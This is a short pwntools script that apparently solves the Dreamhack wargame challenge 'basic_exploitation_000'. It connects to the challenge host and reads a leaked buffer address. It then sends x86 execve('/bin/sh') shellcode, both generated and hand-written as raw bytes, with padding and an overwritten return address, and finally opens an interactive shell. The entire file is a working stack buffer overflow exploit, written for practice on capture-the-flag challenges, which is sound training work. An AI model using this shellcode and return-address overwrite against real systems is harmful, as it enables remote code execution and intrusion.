from pwn import *
from binascii import hexlify
# r = process('./basic_exploitation_000')
r = remote("host2.dreamhack.games", 11892)
tmp = r.recvuntil("buf = (")
# print(tmp)
buf_addr = int(r.recv(10), 16)
# print(buf_addr)
# craft_payload = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"
craft_payload = asm(shellcraft.sh())
a_length = 0x80 - len(craft_payload) - len(p32(buf_addr)) + 0x8
print(a_length)
# print(a_length)
real_payload = craft_payload + (b"\x80" * a_length) + p32(buf_addr)
# print(real_payload)
print(hexlify(real_payload))
print(len(real_payload))
code = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"
code += b"\x80"*106
code += p32(buf_addr)
# print(hexlify(code))
# print(len(code))
# r.send(craft_payload)
r.send(real_payload)
r.interactive()
